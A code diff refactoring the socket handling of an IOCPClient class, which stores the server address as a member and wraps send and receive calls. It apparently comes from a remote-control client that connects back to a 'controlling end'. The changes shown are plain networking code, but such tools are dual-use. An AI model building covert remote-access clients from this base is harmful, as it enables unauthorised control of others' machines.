@@ -98,6 +98,7 @@ VOID IOCPClient::setManagerCallBack(void* Manager,  DataProcessCB dataProcess)
 
 IOCPClient::IOCPClient(State&bExit, bool exit_while_disconnect) : g_bExit(bExit)
 {
+	m_ServerAddr = {};
 	m_nHostPort = 0;
 	m_Manager = NULL;
 #ifdef _WIN32
@@ -126,12 +127,7 @@ IOCPClient::IOCPClient(State&bExit, bool exit_while_disconnect) : g_bExit(bExit)
 IOCPClient::~IOCPClient()
 {
 	m_bIsRunning = FALSE;
-
-	if (m_sClientSocket!=INVALID_SOCKET)
-	{
-		closesocket(m_sClientSocket);
-		m_sClientSocket = INVALID_SOCKET;
-	}
+	Disconnect();
 
 	if (m_hWorkThread!=NULL)
 	{
@@ -210,13 +206,11 @@ BOOL IOCPClient::ConnectServer(const char* szServerIP, unsigned short uPort)
 	}
 
 #ifdef _WIN32
-	//构造sockaddr_in结构 也就是主控端的结构
-	sockaddr_in	ServerAddr;
-	ServerAddr.sin_family	= AF_INET;               //网络层  IP
-	ServerAddr.sin_port	= htons(port);
-	ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sCurIP.c_str());
+	m_ServerAddr.sin_family	= AF_INET;
+	m_ServerAddr.sin_port	= htons(port);
+	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sCurIP.c_str());
 
-	if (connect(m_sClientSocket,(SOCKADDR *)&ServerAddr,sizeof(sockaddr_in)) == SOCKET_ERROR) 
+	if (connect(m_sClientSocket,(SOCKADDR *)&m_ServerAddr,sizeof(sockaddr_in)) == SOCKET_ERROR) 
 	{
 		if (m_sClientSocket!=INVALID_SOCKET)
 		{
@@ -226,12 +220,11 @@ BOOL IOCPClient::ConnectServer(const char* szServerIP, unsigned short uPort)
 		return FALSE;
 	}
 #else
-	sockaddr_in ServerAddr = {};
-	ServerAddr.sin_family = AF_INET;   // 网络层 IP
-	ServerAddr.sin_port = htons(port);
+	m_ServerAddr.sin_family = AF_INET;
+	m_ServerAddr.sin_port = htons(port);
 	// 若szServerIP非数字开头，则认为是域名，需进行IP转换
 	// 使用 inet_pton 替代 inet_addr (inet_pton 可以支持 IPv4 和 IPv6)
-	if (inet_pton(AF_INET, m_sCurIP.c_str(), &ServerAddr.sin_addr) <= 0) {
+	if (inet_pton(AF_INET, m_sCurIP.c_str(), &m_ServerAddr.sin_addr) <= 0) {
 		Mprintf("Invalid address or address not supported\n");
 		return false;
 	}
@@ -244,7 +237,7 @@ BOOL IOCPClient::ConnectServer(const char* szServerIP, unsigned short uPort)
 	}
 
 	// 连接到服务器
-	if (connect(m_sClientSocket, (struct sockaddr*)&ServerAddr, sizeof(ServerAddr)) == -1) {
+	if (connect(m_sClientSocket, (struct sockaddr*)&m_ServerAddr, sizeof(m_ServerAddr)) == -1) {
 		Mprintf("Connection failed\n");
 		close(m_sClientSocket);
 		m_sClientSocket = -1;  // 标记套接字无效
@@ -320,7 +313,7 @@ DWORD WINAPI IOCPClient::WorkThreadProc(LPVOID lParam)
 		}
 		else if (iRet > 0)
 		{
-			int iReceivedLength = recv(This->m_sClientSocket, szBuffer, MAX_RECV_BUFFER-1, 0);
+			int iReceivedLength = This->ReceiveData(szBuffer, MAX_RECV_BUFFER-1, 0);
 			if (iReceivedLength <= 0)
 			{
 				int a = WSAGetLastError();
@@ -496,7 +489,7 @@ BOOL IOCPClient::SendWithSplit(const char* szBuffer, ULONG ulLength, ULONG ulSpl
 		int j = 0;
 		for (; j < ulSendRetry; ++j)
 		{
-			iReturn = send(m_sClientSocket, Travel, ulSplitLength, 0);
+			iReturn = SendTo(Travel, ulSplitLength, 0);
 			if (iReturn > 0)
 			{
 				break;
@@ -516,7 +509,7 @@ BOOL IOCPClient::SendWithSplit(const char* szBuffer, ULONG ulLength, ULONG ulSpl
 		int j = 0;
 		for (; j < ulSendRetry; j++)
 		{
-			iReturn = send(m_sClientSocket, (char*)Travel,i,0);
+			iReturn = SendTo((char*)Travel,i,0);
 
 			if (iReturn > 0)
 			{
